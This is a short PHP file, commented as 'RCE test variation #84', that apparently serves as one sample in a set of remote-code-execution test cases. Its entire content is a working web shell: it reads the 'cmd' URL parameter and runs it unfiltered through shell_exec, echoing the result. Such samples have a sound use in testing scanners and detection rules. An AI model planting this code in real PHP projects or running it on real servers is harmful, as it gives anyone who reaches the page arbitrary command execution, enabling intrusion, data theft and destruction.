<?php
// RCE test variation #84
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>